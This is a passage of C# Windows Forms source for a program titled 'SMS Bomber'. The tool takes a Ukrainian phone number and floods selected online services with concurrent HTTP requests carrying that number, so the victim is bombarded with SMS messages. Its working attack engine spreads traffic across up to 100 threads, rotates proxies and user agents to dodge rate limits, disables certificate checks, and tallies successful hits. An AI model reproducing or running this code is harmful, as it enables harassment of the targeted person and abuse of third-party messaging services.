                Size = new Size(400, 20),
                ForeColor = Color.Gray,
                Font = new Font("Segoe UI", 9),
                BackColor = Color.Transparent,
                Tag = "Tf:subtitle|" + serviceTargets.Count
            };

            var languageCombo = new ComboBox
            {
                Name = "cmbLanguage",
                Location = new Point(1000, 30),
                Size = new Size(150, 25),
                BackColor = Color.FromArgb(40, 40, 40),
                ForeColor = Color.White,
                DropDownStyle = ComboBoxStyle.DropDownList,
                Font = new Font("Segoe UI", 9),
                Tag = "language"
            };
            languageCombo.Items.AddRange(new object[] { "UA", "EN", "RU" });
            languageCombo.SelectedIndex = 0;
            languageCombo.SelectedIndexChanged += ChangeLanguage;

            var languageLabel = new Label
            {
                Text = T("language"),
                Location = new Point(900, 33),
                Size = new Size(90, 20),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 9),
                BackColor = Color.Transparent,
                Tag = "T:language"
            };

            headerPanel.Controls.AddRange(new Control[] { titleLabel, subtitleLabel, languageLabel, languageCombo });
            this.Controls.Add(headerPanel);
        }

        private void InitializeStatsPanel()
        {
            var statsPanel = new Panel
            {
                Location = new Point(20, 100),
                Size = new Size(400, 120),
                BackColor = Color.FromArgb(20, 20, 20),
                BorderStyle = BorderStyle.FixedSingle
            };

            var statsLabel = new Label
            {
                Text = T("attack_stats"),
                Location = new Point(10, 10),
                Size = new Size(200, 20),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 10, FontStyle.Bold),
                Tag = "T:attack_stats"
            };

            var successLabel = new Label
            {
                Name = "lblSuccess",
                Text = T("successful", 0),
                Location = new Point(20, 40),
                Size = new Size(180, 20),
                ForeColor = Color.LimeGreen
            };

            var failedLabel = new Label
            {
                Name = "lblFailed",
                Text = T("failed", 0),
                Location = new Point(20, 65),
                Size = new Size(180, 20),
                ForeColor = Color.Red
            };

            var totalLabel = new Label
            {
                Name = "lblTotal",
                Text = T("total", 0),
                Location = new Point(20, 90),
                Size = new Size(180, 20),
                ForeColor = Color.White
            };

            var rateLabel = new Label
            {
                Name = "lblRate",
                Text = T("success_rate", "0"),
                Location = new Point(200, 40),
                Size = new Size(180, 20),
                ForeColor = Color.Cyan
            };

            var servicesLabel = new Label
            {
                Name = "lblServices",
                Text = T("active_services", 0),
                Location = new Point(200, 65),
                Size = new Size(180, 20),
                ForeColor = Color.White
            };

            var threadsLabel = new Label
            {
                Name = "lblThreads",
                Text = T("threads", 0),
                Location = new Point(200, 90),
                Size = new Size(180, 20),
                ForeColor = Color.Yellow
            };

            statsPanel.Controls.AddRange(new Control[] { statsLabel, successLabel, failedLabel, totalLabel, rateLabel, servicesLabel, threadsLabel });
            this.Controls.Add(statsPanel);
        }

        private void InitializeControlsPanel()
        {
            var controlsPanel = new Panel
            {
                Location = new Point(440, 100),
                Size = new Size(350, 120),
                BackColor = Color.FromArgb(20, 20, 20),
                BorderStyle = BorderStyle.FixedSingle
            };

            var phoneLabel = new Label
            {
                Text = T("phone_number"),
                Location = new Point(10, 10),
                Size = new Size(200, 20),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 9, FontStyle.Bold),
                Tag = "T:phone_number"
            };

            var phoneTextBox = new TextBox
            {
                Name = "txtPhone",
                Location = new Point(10, 35),
                Size = new Size(200, 25),
                BackColor = Color.FromArgb(40, 40, 40),
                ForeColor = Color.White,
                BorderStyle = BorderStyle.FixedSingle,
                Font = new Font("Segoe UI", 10)
            };

            var formatLabel = new Label
            {
                Text = T("phone_format"),
                Location = new Point(220, 38),
                Size = new Size(120, 20),
                ForeColor = Color.Gray,
                Font = new Font("Segoe UI", 8),
                Tag = "T:phone_format"
            };

            var startButton = new Button
            {
                Name = "btnStart",
                Text = T("start_attack"),
                Location = new Point(10, 70),
                Size = new Size(160, 35),
                BackColor = Color.FromArgb(0, 122, 204),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 9, FontStyle.Bold),
                Tag = "T:start_attack"
            };
            startButton.Click += StartAttack;

            var stopButton = new Button
            {
                Name = "btnStop",
                Text = T("stop_attack"),
                Location = new Point(180, 70),
                Size = new Size(160, 35),
                BackColor = Color.FromArgb(200, 60, 60),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 9, FontStyle.Bold),
                Enabled = false,
                Tag = "T:stop_attack"
            };
            stopButton.Click += StopAttack;

            controlsPanel.Controls.AddRange(new Control[] { 
                phoneLabel, phoneTextBox, formatLabel, startButton, stopButton 
            });
            this.Controls.Add(controlsPanel);
        }

        private void InitializeProxyPanel()
        {
            var proxyPanel = new Panel
            {
                Location = new Point(810, 100),
                Size = new Size(370, 120),
                BackColor = Color.FromArgb(20, 20, 20),
                BorderStyle = BorderStyle.FixedSingle
            };

            var proxyLabel = new Label
            {
                Text = T("proxy_management"),
                Location = new Point(10, 10),
                Size = new Size(200, 20),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 9, FontStyle.Bold),
                Tag = "T:proxy_management"
            };

            var proxyCountLabel = new Label
            {
                Name = "lblProxyCount",
                Text = T("active_proxies", proxyList.Count),
                Location = new Point(220, 10),
                Size = new Size(140, 20),
                ForeColor = Color.Yellow,
                Font = new Font("Segoe UI", 8)
            };

            var proxyTextBox = new TextBox
            {
                Name = "txtProxy",
                Location = new Point(10, 35),
                Size = new Size(250, 25),
                BackColor = Color.FromArgb(40, 40, 40),
                ForeColor = Color.White,
                BorderStyle = BorderStyle.FixedSingle,
                Font = new Font("Segoe UI", 9)
            };

            var addProxyButton = new Button
            {
                Text = T("add_proxy"),
                Location = new Point(270, 35),
                Size = new Size(90, 25),
                BackColor = Color.FromArgb(60, 60, 60),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 8, FontStyle.Bold),
                Tag = "T:add_proxy"
            };
            addProxyButton.Click += AddProxy;

            var clearProxyButton = new Button
            {
                Text = T("clear_all"),
                Location = new Point(10, 70),
                Size = new Size(110, 25),
                BackColor = Color.FromArgb(100, 60, 60),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 8, FontStyle.Bold),
                Tag = "T:clear_all"
            };
            clearProxyButton.Click += ClearAllProxies;

            var loadProxyButton = new Button
            {
                Text = T("load_from_file"),
                Location = new Point(130, 70),
                Size = new Size(110, 25),
                BackColor = Color.FromArgb(60, 60, 100),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 8, FontStyle.Bold),
                Tag = "T:load_from_file"
            };
            loadProxyButton.Click += LoadProxiesFromFile;

            var saveProxyButton = new Button
            {
                Text = T("save_proxies"),
                Location = new Point(250, 70),
                Size = new Size(110, 25),
                BackColor = Color.FromArgb(60, 100, 60),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 8, FontStyle.Bold),
                Tag = "T:save_proxies"
            };
            saveProxyButton.Click += SaveProxiesToFile;

            proxyPanel.Controls.AddRange(new Control[] { 
                proxyLabel, proxyCountLabel, proxyTextBox, addProxyButton, 
                clearProxyButton, loadProxyButton, saveProxyButton 
            });
            this.Controls.Add(proxyPanel);
        }

        private void InitializeServicesPanel()
        {
            var servicesPanel = new Panel
            {
                Location = new Point(20, 240),
                Size = new Size(500, 250),
                BackColor = Color.FromArgb(20, 20, 20),
                BorderStyle = BorderStyle.FixedSingle
            };

            var servicesLabel = new Label
            {
                Text = T("service_selection", serviceTargets.Count),
                Location = new Point(10, 10),
                Size = new Size(300, 20),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 10, FontStyle.Bold),
                Tag = "Tf:service_selection|" + serviceTargets.Count
            };

            var selectAllButton = new Button
            {
                Text = T("select_all"),
                Location = new Point(350, 10),
                Size = new Size(140, 25),
                BackColor = Color.FromArgb(60, 60, 60),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 8, FontStyle.Bold),
                Tag = "T:select_all"
            };
            selectAllButton.Click += (s, e) => ToggleAllServices(true);

            var deselectAllButton = new Button
            {
                Text = T("deselect_all"),
                Location = new Point(350, 40),
                Size = new Size(140, 25),
                BackColor = Color.FromArgb(60, 60, 60),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 8, FontStyle.Bold),
                Tag = "T:deselect_all"
            };
            deselectAllButton.Click += (s, e) => ToggleAllServices(false);

            var flowPanel = new FlowLayoutPanel
            {
                Name = "flowServices",
                Location = new Point(10, 40),
                Size = new Size(330, 200),
                AutoScroll = true,
                BackColor = Color.FromArgb(30, 30, 30)
            };

            foreach (var service in serviceTargets)
            {
                var checkBox = new CheckBox
                {
                    Text = service.Name,
                    Checked = true,
                    ForeColor = Color.White,
                    BackColor = Color.Transparent,
                    Size = new Size(150, 20),
                    Tag = service,
                    Font = new Font("Segoe UI", 8)
                };
                flowPanel.Controls.Add(checkBox);
            }

            servicesPanel.Controls.AddRange(new Control[] { servicesLabel, selectAllButton, deselectAllButton, flowPanel });
            this.Controls.Add(servicesPanel);
        }

        private void InitializeLogPanel()
        {
            var logPanel = new Panel
            {
                Location = new Point(540, 240),
                Size = new Size(640, 520),
                BackColor = Color.FromArgb(20, 20, 20),
                BorderStyle = BorderStyle.FixedSingle
            };

            var logLabel = new Label
            {
                Text = T("attack_log"),
                Location = new Point(10, 10),
                Size = new Size(200, 20),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 10, FontStyle.Bold),
                Tag = "T:attack_log"
            };

            var clearLogButton = new Button
            {
                Text = T("clear_log"),
                Location = new Point(500, 10),
                Size = new Size(120, 25),
                BackColor = Color.FromArgb(60, 60, 60),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 8, FontStyle.Bold),
                Tag = "T:clear_log"
            };
            clearLogButton.Click += (s, e) => 
            {
                var logBox = Controls.Find("txtLog", true).FirstOrDefault() as RichTextBox;
                logBox?.Clear();
            };

            var exportLogButton = new Button
            {
                Text = T("export_log"),
                Location = new Point(500, 40),
                Size = new Size(120, 25),
                BackColor = Color.FromArgb(60, 60, 60),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 8, FontStyle.Bold),
                Tag = "T:export_log"
            };
            exportLogButton.Click += ExportLogToFile;

            var logTextBox = new RichTextBox
            {
                Name = "txtLog",
                Location = new Point(10, 40),
                Size = new Size(480, 470),
                BackColor = Color.Black,
                ForeColor = Color.LimeGreen,
                BorderStyle = BorderStyle.FixedSingle,
                Font = new Font("Consolas", 9),
                ReadOnly = true,
                ScrollBars = RichTextBoxScrollBars.Vertical
            };

            var speedPanel = new Panel
            {
                Location = new Point(500, 70),
                Size = new Size(130, 100),
                BackColor = Color.FromArgb(30, 30, 30),
                BorderStyle = BorderStyle.FixedSingle
            };

            var speedLabel = new Label
            {
                Text = T("speed"),
                Location = new Point(10, 10),
                Size = new Size(100, 20),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 9, FontStyle.Bold),
                Tag = "T:speed"
            };

            var speedComboBox = new ComboBox
            {
                Name = "cmbSpeed",
                Location = new Point(10, 35),
                Size = new Size(110, 25),
                BackColor = Color.FromArgb(40, 40, 40),
                ForeColor = Color.White,
                DropDownStyle = ComboBoxStyle.DropDownList,
                Font = new Font("Segoe UI", 8)
            };
            
            speedComboBox.Items.AddRange(new object[] { 
                T("slow"), T("medium"), T("fast"), T("turbo")
            });
            speedComboBox.SelectedIndex = 2;

            speedPanel.Controls.AddRange(new Control[] { speedLabel, speedComboBox });
            logPanel.Controls.AddRange(new Control[] { logLabel, clearLogButton, exportLogButton, logTextBox, speedPanel });
            this.Controls.Add(logPanel);
        }

        private void ChangeLanguage(object sender, EventArgs e)
        {
            var combo = sender as ComboBox;
            if (combo != null)
            {
                switch (combo.SelectedItem.ToString())
                {
                    case "UA": currentLanguage = "ua"; break;
                    case "EN": currentLanguage = "en"; break;
                    case "RU": currentLanguage = "ru"; break;
                }
                UpdateLanguage();
            }
        }

        private void AddProxy(object sender, EventArgs e)
        {
            var proxyTextBox = Controls.Find("txtProxy", true).FirstOrDefault() as TextBox;
            if (proxyTextBox == null || string.IsNullOrWhiteSpace(proxyTextBox.Text))
                return;

            string proxy = proxyTextBox.Text.Trim();
            
            if (!Regex.IsMatch(proxy, @"^(\S+:\S+@)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$"))
            {
                AddLog(T("invalid_proxy_format", proxy), Color.Red);
                return;
            }

            if (!proxyList.Contains(proxy))
            {
                proxyList.Add(proxy);
                AddLog(T("proxy_added", proxy), Color.LightGreen);
                proxyTextBox.Clear();
                UpdateProxyCount();
            }
            else
            {
                AddLog(T("proxy_exists", proxy), Color.Orange);
            }
        }

        private void ClearAllProxies(object sender, EventArgs e)
        {
            if (MessageBox.Show("Clear all proxies?", "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                proxyList.Clear();
                AddLog(T("proxies_cleared"), Color.Orange);
                UpdateProxyCount();
            }
        }

        private void LoadProxiesFromFile(object sender, EventArgs e)
        {
            using var openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
            openFileDialog.Title = "Load proxies from file";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    var lines = File.ReadAllLines(openFileDialog.FileName);
                    int loaded = 0;
                    
                    foreach (string line in lines)
                    {
                        string proxy = line.Trim();
                        if (!string.IsNullOrEmpty(proxy) && !proxyList.Contains(proxy))
                        {
                            proxyList.Add(proxy);
                            loaded++;
                        }
                    }
                    
                    AddLog(T("proxies_loaded", loaded), Color.LightGreen);
                    UpdateProxyCount();
                }
                catch (Exception ex)
                {
                    AddLog(T("error_loading_proxies", ex.Message), Color.Red);
                }
            }
        }

        private void SaveProxiesToFile(object sender, EventArgs e)
        {
            using var saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
            saveFileDialog.Title = "Save proxies to file";

            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    File.WriteAllLines(saveFileDialog.FileName, proxyList);
                    AddLog(T("proxies_saved", proxyList.Count), Color.LightGreen);
                }
                catch (Exception ex)
                {
                    AddLog(T("error_saving_proxies", ex.Message), Color.Red);
                }
            }
        }

        private void ExportLogToFile(object sender, EventArgs e)
        {
            using var saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
            saveFileDialog.Title = "Export log to file";

            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    var logBox = Controls.Find("txtLog", true).FirstOrDefault() as RichTextBox;
                    File.WriteAllText(saveFileDialog.FileName, logBox?.Text ?? "");
                    AddLog(T("log_exported"), Color.LightGreen);
                }
                catch (Exception ex)
                {
                    AddLog(T("error_exporting_log", ex.Message), Color.Red);
                }
            }
        }

        private void UpdateProxyCount()
        {
            if (InvokeRequired)
            {
                Invoke(new Action(UpdateProxyCount));
                return;
            }

            var proxyCountLabel = Controls.Find("lblProxyCount", true).FirstOrDefault() as Label;
            if (proxyCountLabel != null)
            {
                proxyCountLabel.Text = T("active_proxies", proxyList.Count);
            }
        }

        private void ToggleAllServices(bool check)
        {
            var flowPanel = Controls.Find("flowServices", true).FirstOrDefault() as FlowLayoutPanel;
            if (flowPanel != null)
            {
                foreach (CheckBox checkBox in flowPanel.Controls)
                {
                    checkBox.Checked = check;
                }
            }
            UpdateServicesCount();
        }

        private List<ServiceTarget> GetSelectedServices()
        {
            var selectedServices = new List<ServiceTarget>();
            var flowPanel = Controls.Find("flowServices", true).FirstOrDefault() as FlowLayoutPanel;
            
            if (flowPanel != null)
            {
                foreach (CheckBox checkBox in flowPanel.Controls)
                {
                    if (checkBox.Checked && checkBox.Tag is ServiceTarget service)
                    {
                        selectedServices.Add(service);
                    }
                }
            }
            
            return selectedServices;
        }

        private void UpdateServicesCount()
        {
            if (InvokeRequired)
            {
                Invoke(new Action(UpdateServicesCount));
                return;
            }

            var servicesLabel = Controls.Find("lblServices", true).FirstOrDefault() as Label;
            if (servicesLabel != null)
            {
                var selectedCount = GetSelectedServices().Count;
                servicesLabel.Text = T("active_services", selectedCount);
            }
        }

        private void AddLog(string message, Color color)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<string, Color>(AddLog), message, color);
                return;
            }

            var logBox = Controls.Find("txtLog", true).FirstOrDefault() as RichTextBox;
            if (logBox != null)
            {
                logBox.SelectionColor = color;
                logBox.AppendText($"[{DateTime.Now:HH:mm:ss}] {message}\n");
                logBox.ScrollToCaret();
            }
        }

        private void UpdateStats()
        {
            if (InvokeRequired)
            {
                Invoke(new Action(UpdateStats));
                return;
            }

            var successLabel = Controls.Find("lblSuccess", true).FirstOrDefault() as Label;
            var failedLabel = Controls.Find("lblFailed", true).FirstOrDefault() as Label;
            var totalLabel = Controls.Find("lblTotal", true).FirstOrDefault() as Label;
            var rateLabel = Controls.Find("lblRate", true).FirstOrDefault() as Label;
            var threadsLabel = Controls.Find("lblThreads", true).FirstOrDefault() as Label;

            if (successLabel != null) successLabel.Text = T("successful", successfulRequests);
            if (failedLabel != null) failedLabel.Text = T("failed", failedRequests);
            if (totalLabel != null) totalLabel.Text = T("total", totalRequests);
            if (threadsLabel != null) threadsLabel.Text = T("threads", GetThreadCount());

            double successRate = totalRequests > 0 ? (double)successfulRequests / totalRequests * 100 : 0;
            if (rateLabel != null) rateLabel.Text = T("success_rate", successRate.ToString("F1"));

            UpdateServicesCount();
        }

        private void UpdateStatus(string status, Color color)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<string, Color>(UpdateStatus), status, color);
                return;
            }

            var statusLabel = Controls.Find("lblStatus", true).FirstOrDefault() as Label;
            if (statusLabel != null)
            {
                statusLabel.Text = T("status", status);
                statusLabel.ForeColor = color;
            }
        }

        private int GetThreadCount()
        {
            var speedComboBox = Controls.Find("cmbSpeed", true).FirstOrDefault() as ComboBox;
            return speedComboBox?.SelectedIndex switch
            {
                0 => 10,
                1 => 25,
                2 => 50,
                3 => 100,
                _ => 50
            };
        }

        private async void StartAttack(object sender, EventArgs e)
        {
            var phoneTextBox = Controls.Find("txtPhone", true).FirstOrDefault() as TextBox;
            if (phoneTextBox == null) return;

            string phone = "38" + phoneTextBox.Text.Trim();

            if (!Regex.IsMatch(phone, @"^380\d{9}$"))
            {
                MessageBox.Show(T("invalid_phone"), "Error", 
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            var selectedServices = GetSelectedServices();
            if (selectedServices.Count == 0)
            {
                MessageBox.Show(T("no_services"), "Error", 
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            isAttackRunning = true;
            cancellationTokenSource = new CancellationTokenSource();

            var startButton = Controls.Find("btnStart", true).FirstOrDefault() as Button;
            var stopButton = Controls.Find("btnStop", true).FirstOrDefault() as Button;

            if (startButton != null) startButton.Enabled = false;
            if (stopButton != null) stopButton.Enabled = true;

            UpdateStatus(T("attack_started"), Color.LimeGreen);
            AddLog(T("attack_started_log", phone), Color.Cyan);
            AddLog(T("services_selected_log", selectedServices.Count), Color.Yellow);
            AddLog(T("proxies_active_log", proxyList.Count), Color.Magenta);
            AddLog(T("speed_mode_log", GetThreadCount()), Color.White);

            ServicePointManager.DefaultConnectionLimit = 1000;
            ServicePointManager.Expect100Continue = false;
            ServicePointManager.UseNagleAlgorithm = false;

            try
            {
                await Task.Run(() => RunTurboAttack(phone, selectedServices, cancellationTokenSource.Token));
            }
            catch (OperationCanceledException)
            {
            }
            catch (Exception ex)
            {
                AddLog($"Attack error: {ex.Message}", Color.Red);
            }
        }

        private void StopAttack(object sender, EventArgs e)
        {
            isAttackRunning = false;
            cancellationTokenSource?.Cancel();

            var startButton = Controls.Find("btnStart", true).FirstOrDefault() as Button;
            var stopButton = Controls.Find("btnStop", true).FirstOrDefault() as Button;

            if (startButton != null) startButton.Enabled = true;
            if (stopButton != null) stopButton.Enabled = false;

            UpdateStatus(T("attack_stopped"), Color.Orange);
            AddLog(T("attack_stopped_log"), Color.Orange);
        }

        private async Task RunTurboAttack(string phone, List<ServiceTarget> services, CancellationToken cancellationToken)
        {
            int threadCount = GetThreadCount();
            var semaphore = new SemaphoreSlim(threadCount);

            while (isAttackRunning && !cancellationToken.IsCancellationRequested)
            {
                var tasks = new List<Task>();
                
                for (int i = 0; i < threadCount; i++)
                {
                    if (!isAttackRunning || cancellationToken.IsCancellationRequested)
                        break;
                    
                    tasks.Add(Task.Run(async () =>
                    {
                        await semaphore.WaitAsync(cancellationToken);
                        try
                        {
                            if (!isAttackRunning || cancellationToken.IsCancellationRequested)
                                return;

                            var service = services[random.Next(services.Count)];
                            if (proxyList.Count > 0 && random.Next(2) == 0)
                            {
                                var proxy = proxyList[random.Next(proxyList.Count)];
                                await SendFastRequest(service, phone, proxy, cancellationToken);
                            }
                            else
                            {
                                await SendFastRequest(service, phone, null, cancellationToken);
                            }
                        }
                        catch (OperationCanceledException)
                        {
                        }
                        catch (Exception ex)
                        {
                        }
                        finally
                        {
                            semaphore.Release();
                        }
                    }, cancellationToken));
                }

                try
                {
                    await Task.WhenAll(tasks);
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                
                if (threadCount >= 50)
                    await Task.Delay(10, cancellationToken);
                else
                    await Task.Delay(100, cancellationToken);
            }
        }

        private async Task SendFastRequest(ServiceTarget service, string phone, string proxyAddress, CancellationToken cancellationToken)
        {
            try
            {
                using var handler = new HttpClientHandler();
                
                if (!string.IsNullOrEmpty(proxyAddress))
                {
                    handler.Proxy = new WebProxy(proxyAddress);
                    handler.UseProxy = true;
                }
                
                handler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                handler.UseCookies = false;

                using var httpClient = new HttpClient(handler)
                {
                    Timeout = TimeSpan.FromSeconds(2)
                };

                httpClient.DefaultRequestHeaders.Add("User-Agent", GenerateUserAgent());
                
                var processedData = ProcessData(service.Data, phone);
                var content = new StringContent(processedData, Encoding.UTF8, service.ContentType);

                var response = await httpClient.SendAsync(new HttpRequestMessage(service.Method, service.Url)
                {
                    Content = content
                }, cancellationToken);

                Interlocked.Increment(ref totalRequests);
                if (response.IsSuccessStatusCode)
                {
                    Interlocked.Increment(ref successfulRequests);
                    if (successfulRequests % 20 == 0)
                        AddLog($"✅ {service.Name} - Success (total: {successfulRequests})", Color.LightGreen);
                }
                else
                {
                    Interlocked.Increment(ref failedRequests);
                }
            }
            catch (OperationCanceledException)
            {
            }
            catch
            {
                Interlocked.Increment(ref totalRequests);
                Interlocked.Increment(ref failedRequests);
            }

            if (totalRequests % 10 == 0)
                UpdateStats();
        }

        private string ProcessData(string data, string phone)
        {
            return data.Replace("{phone}", phone)
                      .Replace("{random}", random.Next(1000, 9999).ToString());
        }

        private string GenerateUserAgent()
        {
            return userAgents[random.Next(userAgents.Count)];
        }

        public class ServiceTarget
        {
            public string Name { get; set; }
            public string Url { get; set; }
            public string Data { get; set; }
            public HttpMethod Method { get; set; }
            public string ContentType { get; set; }

            public ServiceTarget(string name, string url, string data, HttpMethod method, string contentType = "application/json")
            {
                Name = name;
                Url = url;
                Data = data;
                Method = method;
                ContentType = contentType;
            }
        }

        private System.ComponentModel.IContainer components = null;
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
                cancellationTokenSource?.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1200, 800);
            this.Text = "SMS Bomber | envy0xc0";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
        }
    }
}
